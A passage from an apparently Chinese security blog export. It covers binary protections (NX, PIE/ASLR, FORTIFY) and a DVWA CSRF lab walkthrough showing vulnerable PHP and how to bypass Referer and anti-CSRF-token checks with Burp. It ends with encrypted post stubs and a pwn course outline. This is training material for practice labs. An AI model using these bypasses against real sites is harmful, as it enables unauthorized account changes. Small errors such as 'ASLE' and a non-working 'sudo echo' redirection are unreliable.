<p><code>NX</code> 即 <code>No-eXecute</code>（不可执行）的意思，<code>NX（DEP）</code>的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 <code>shellcode</code>时，程序会尝试在数据页面上执行指令，此时 <code>CPU</code> 就会抛出异常，而不是去执行恶意指令。</p>
<ul>
<li>开启方式</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c					// 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o test test.c		// 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o test test.c	// 开启NX保护</span><br></pre></td></tr></table></figure></div>

<p><strong>PIE &amp; ASLR</strong></p>
<ul>
<li>简介</li>
</ul>
<p><code>ASLR</code>保护分为三个层级:</p>
<div class="highlight-container" data-rel="Tex"><figure class="iseeu highlight tex"><table><tr><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈和堆的随机化。</span><br></pre></td></tr></table></figure></div>

<p><code>PIE</code> 保护即位置无关的可执行文件，程序开启地址随机化选、意味着程序每次运行的时候地址都会变化，包含 <code>.bss</code>，<code>.text</code>, <code>.data</code> 等段都会被随机化。</p>
<ul>
<li>开启方式</li>
</ul>
<p><code>PIE</code></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c				// 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o test test.c		// 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o test test.c		// 开启PIE，此时为最高强度2</span><br><span class="line">gcc -fpic -o test test.c		// 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o test test.c		// 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure></div>

<p><code>ASLE</code></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo echo 0 &gt; /proc/sys/kernel/randomize_va_space # 0 - 表示关闭进程地址空间随机化。</span><br><span class="line">sudo echo 1 &gt; /proc/sys/kernel/randomize_va_space # 1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">sudo echo 2 &gt; /proc/sys/kernel/randomize_va_space # 2 - 表示在1的基础上增加栈和堆的随机化。</span><br></pre></td></tr></table></figure></div>

<p><strong>FORTIFY</strong></p>
<ul>
<li>简介</li>
</ul>
<p><code>fority</code> 其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如<code>memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets</code>以及宽字符的变体。</p>
<p>例如 :</p>
<ul>
<li>开启方式</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c							// 默认情况下，不会开这个检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE=1 -o test test.c		// 较弱的检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE=2 -o test test.c		// 较强的检查</span><br></pre></td></tr></table></figure></div>













]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn_Base_knowledge</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全-CSRF</title>
    <url>/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/</url>
    <content><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>一般来说，攻击者通过伪造用户的浏览器的请求，向访问一个用户自己曾经认证访问过的网站发送出去，使目标网站接收并误以为是用户的真实操作而去执行命令。利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。</p>
<h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_GET[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_conf = $_GET[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Do the passwords match?</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update the database</span><br><span class="line">        $current_user = dvwaCurrentUser();</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . $current_user . &quot;&#x27;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011094240554.png"
                      alt="image-20231011094240554"
                ></p>
<p>没有做任何防护。直接输入新密码即可。</p>
<ul>
<li>抓包查看</li>
</ul>
<p>将密码修改为 <code>123456</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011094451943.png"
                      alt="image-20231011094451943"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011095446264.png"
                      alt="image-20231011095446264"
                ></p>
<ul>
<li>Attack</li>
</ul>
<p><code>URL</code> 就是一个 <code>GET</code> 请求。诱骗用户点击此链接即可就会在用户不知情的情况下修改密码为 <code>123456</code>。</p>
<ol>
<li>拦截请求后，右击请求界面，选择生成CSRF PoC</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011102256026.png"
                      alt="image-20231011102256026"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011103354780.png"
                      alt="image-20231011103354780"
                ></p>
<ol start="2">
<li>点击用浏览器中测试。</li>
</ol>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011103421274.png"
                      alt="image-20231011103421274"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231011103930091.png"
                      alt="image-20231011103930091"
                ></p>
<p>复制弹出来的 <code>URL</code> ，将<code>burpsuite</code> 改为 <code>ip:8080</code> 比如 <code>127.0.0.1:8080</code>，访问这个 <code>URL</code> 将会自动跳转到修改密码 <code>URL</code> ，并修改密码为 <code>123456</code>。</p>
<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Checks to see where the request came from</span><br><span class="line">    if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) &#123;</span><br><span class="line">        // Get input</span><br><span class="line">        $pass_new  = $_GET[ &#x27;password_new&#x27; ];</span><br><span class="line">        $pass_conf = $_GET[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">        // Do the passwords match?</span><br><span class="line">        if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            // They do!</span><br><span class="line">            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            // Update the database</span><br><span class="line">            $current_user = dvwaCurrentUser();</span><br><span class="line">            $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . $current_user . &quot;&#x27;;&quot;;</span><br><span class="line">            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">            // Feedback for the user</span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // Issue with passwords matching</span><br><span class="line">            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Didn&#x27;t come from a trusted source</span><br><span class="line">        echo &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>检测机制：在修改密码等敏感操作时，会检测 <code>referer</code> 请求来源地址，里面是否存在主机 <code>ip</code> 或域名。我们可以构造一个有效的 <code>Referer</code>，可以在攻击服务器上创建一个新的 <code>html</code> 页面，命名时 要含有 <code>csrf</code> 网站主机 <code>ip</code> 地址。所以这对本地搭建的无影响。我们通过回环和局域网 <code>Ip</code> 的方式来进行测试。</p>
<p>假如服务器地址为 <code>192.168.66.66</code>，即为 <code>SERVER_NAME</code>，我们只需要把我们构造的恶意页面文件名改为 <code>192.168.66.66.html</code>，<code>HTTP_REFERER</code>就会包含<code>192.168.66.66.html</code>,就可以绕过 <code>stripos</code>了。</p>
<ul>
<li>Attack</li>
</ul>
<ol>
<li>通过本地 <code>IP</code> 访问 <code>dvwa</code> 页面，利用 <code>burp</code> 抓包，并制作 <code>CSRF PoC</code>。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012145844804.png"
                      alt="image-20231012145844804"
                ></p>
<ol start="2">
<li>复制 <code>HTML</code> 代码，并将其命名为<code>192.168.56.1</code> 放在 <code>WWW</code> 目录下。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012145945233.png"
                      alt="image-20231012145945233"
                ></p>
<ol start="3">
<li>放行原来的包将密码改回 <code>password</code>，通过回环访问本地的<code>192.168.56.1.html</code>文件并抓包。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012150205921.png"
                      alt="image-20231012150205921"
                ></p>
<p>可以看见 <code>referer</code> 和 <code>host</code> 的地址并不相同，我们将 <code>referer</code> 指向 攻击者服务器地址即 <code>192.168.56.1.html</code>即可绕过。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012150452551.png"
                      alt="image-20231012150452551"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012150521082.png"
                      alt="image-20231012150521082"
                ></p>
<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$change = false;</span><br><span class="line">$request_type = &quot;html&quot;;</span><br><span class="line">$return_message = &quot;Request Failed&quot;;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] == &quot;POST&quot; &amp;&amp; array_key_exists (&quot;CONTENT_TYPE&quot;, $_SERVER) &amp;&amp; $_SERVER[&#x27;CONTENT_TYPE&#x27;] == &quot;application/json&quot;) &#123;</span><br><span class="line">    $data = json_decode(file_get_contents(&#x27;php://input&#x27;), true);</span><br><span class="line">    $request_type = &quot;json&quot;;</span><br><span class="line">    if (array_key_exists(&quot;HTTP_USER_TOKEN&quot;, $_SERVER) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;password_new&quot;, $data) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;password_conf&quot;, $data) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;Change&quot;, $data)) &#123;</span><br><span class="line">        $token = $_SERVER[&#x27;HTTP_USER_TOKEN&#x27;];</span><br><span class="line">        $pass_new = $data[&quot;password_new&quot;];</span><br><span class="line">        $pass_conf = $data[&quot;password_conf&quot;];</span><br><span class="line">        $change = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if (array_key_exists(&quot;user_token&quot;, $_REQUEST) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;password_new&quot;, $_REQUEST) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;password_conf&quot;, $_REQUEST) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;Change&quot;, $_REQUEST)) &#123;</span><br><span class="line">        $token = $_REQUEST[&quot;user_token&quot;];</span><br><span class="line">        $pass_new = $_REQUEST[&quot;password_new&quot;];</span><br><span class="line">        $pass_conf = $_REQUEST[&quot;password_conf&quot;];</span><br><span class="line">        $change = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($change) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $token, $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Do the passwords match?</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">        $pass_new = mysqli_real_escape_string ($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new);</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update the database</span><br><span class="line">        $current_user = dvwaCurrentUser();</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &#x27;&quot; . $pass_new . &quot;&#x27; WHERE user = &#x27;&quot; . $current_user . &quot;&#x27;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert );</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        $return_message = &quot;Password Changed.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        $return_message = &quot;Passwords did not match.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line"></span><br><span class="line">    if ($request_type == &quot;json&quot;) &#123;</span><br><span class="line">        generateSessionToken();</span><br><span class="line">        header (&quot;Content-Type: application/json&quot;);</span><br><span class="line">        print json_encode (array(&quot;Message&quot; =&gt;$return_message));</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;pre&gt;&quot; . $return_message . &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><code>checkToken</code>函数来实现 <code>Anti-csrf  token</code> 机制，用户每次访问更改密码页面时，服务器会返回一个随机的 <code>token</code>，之后每次向服务器发起请求，服务器会优先验证<code>token</code>，如果token正确，那么才会处理请求。所以我们在发起请求之前需要获取服务器返回的<code>user_token</code>，利用<code>user_token</code>绕过验证。这里我们可以使用<code>burpsuit</code>的<code>CSRF Token Tracker</code>插件可以直接绕过<code>user_token</code>验证。</p>
<ul>
<li>Attack</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012152409701.png"
                      alt="image-20231012152409701"
                ></p>
<p>添加 <code>Host</code> 和 <code>Name</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012152829738.png"
                      alt="image-20231012152829738"
                ></p>
<p>发送到 <code>repeater</code>，每次发送都会随机<code>token</code>的值，直接发送即可。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解Pwn_Kernel及相关例题</title>
    <url>/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="b3664d39eebd2728ffdbd1d9048299c7f44466a42b06f38b8b3deb947ea552f4"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn_Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解Pwn_Other及相关例题</title>
    <url>/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Other%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fd8ec72110e70274006307f63666656a035130746a458f716ce73b572e790b77"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn_Other</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透手札之信息收集</title>
    <url>/2023/12/26/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="507caea213511db4b7d88a384b08a49d69baa422bdfa50fd4797e224f9e6b65b"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透手札之免杀与远控</title>
    <url>/2024/01/19/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%85%8D%E6%9D%80%E4%B8%8E%E8%BF%9C%E6%8E%A7/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="ea1f5e1702534b10379794d27d972e77e4d23eee8387dcdb92b3dc45abb01c12">2d806215ddc7c4fd1f6babc1a9ab678d6b15992746f26bfdbdf0a2f49fb26f637efa9558e74f8d414916a01f5fabf711743c93f126a6f95dffbf7e12a69fb5cbca9235d7a9821cce9d1bec6ab0a499cb63ab785fc57f954f16234ce12ded4ad652273d88b573ebcd6bc407cc682ce7b3067ecf51acff809f69bcf1047b03eddc8ef3b521772da605e74d77384b4a03acb091e2f000943e31fa30cf07cf15dabbb536c5d8b053adff6d5913f691355cba967eb72662292ed03f18e59cfd6a8b1a99632df0660509d6de38acd29346a09391f456110ba82f8894ac4075d8c0c88f1ce0a34507dfb56b9377fb30fab48589bc95604d2e4802037dc9d387f9f3b15a1bc43c1c3973d7799063beee0bc32fbe35e912c3c4592dca955bdace98ffa60c270715cc35af7f178e85b2d41a336c8b8d52a9bb354efb1ecae49c98a3078347009449d4b345856c84cfcd91df6552bab25f406b03a797a3f0ae0118accdeccdc10c54dfb7f5c0a4845408db583d618b8fd989bea0986e1852ee1487011924cb4b1ae2868fba3c93f993c47637dd004954696e8698ea6d1fa73f4042021096c28ad91805b5f7e6273224b1b86817c41583a660ebad41898feb16456065f7a781866677c30069a7a32824ff1804bcfacc</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>免杀与远控</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机科学中的数学</title>
    <url>/2023/10/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%A6/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>math</tag>
      </tags>
  </entry>
  <entry>
    <title>课程上架看雪学苑</title>
    <url>/2024/01/19/%E8%AF%BE%E7%A8%8B%E4%B8%8A%E6%9E%B6%E7%9C%8B%E9%9B%AA%E5%AD%A6%E8%8B%91/</url>
    <content><![CDATA[<h1 id="课程目录"><a href="#课程目录" class="headerlink" title="课程目录"></a>课程目录</h1><p><strong>历时良久，精心制作的课程上架看雪学苑了</strong>!!! 讲师曾多次在全国以及国际CTF大赛获取奖项，也多次获得取证和大数据的奖项，也是多次参加红队护网。课程分为四部分，目录好多都包含了很多内容，写的简短些，比如<code>kernel pwn</code>的利用该和<code>heap</code>以及<code>IO_FILE</code>的利用等。目前<a class="link"   href="https://www.kanxue.com/book-leaflet-172.htm" >第一部分 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>已上线看雪学苑，主打一个硬核，并且未来还会在此课程中继续更新其他内容！</p>
<h2 id="Linux-pwn-探索篇"><a href="#Linux-pwn-探索篇" class="headerlink" title="Linux pwn 探索篇"></a>Linux pwn 探索篇</h2><p><a class="link"   href="https://www.kanxue.com/book-leaflet-172.htm" >课程链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<table>
<thead>
<tr>
<th><strong>linux user pwn 基础篇</strong></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>课程介绍</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>课程简介</td>
</tr>
<tr>
<td></td>
<td></td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>课程目录</td>
</tr>
<tr>
<td></td>
<td></td>
<td>学习建议</td>
</tr>
<tr>
<td>2</td>
<td>环境搭建</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td>3</td>
<td>二进制基础上</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>ELF文件</td>
</tr>
<tr>
<td></td>
<td></td>
<td>编译过程</td>
</tr>
<tr>
<td></td>
<td></td>
<td>链接</td>
</tr>
<tr>
<td></td>
<td></td>
<td>加载</td>
</tr>
<tr>
<td>4</td>
<td>二进制基础下</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>共享库</td>
</tr>
<tr>
<td></td>
<td></td>
<td>多线程与TLS</td>
</tr>
<tr>
<td></td>
<td></td>
<td>常见保护</td>
</tr>
<tr>
<td></td>
<td></td>
<td>调用约定</td>
</tr>
<tr>
<td><strong>linux user pwn 栈篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>栈上的逻辑漏洞</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>2</td>
<td>ret2text</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
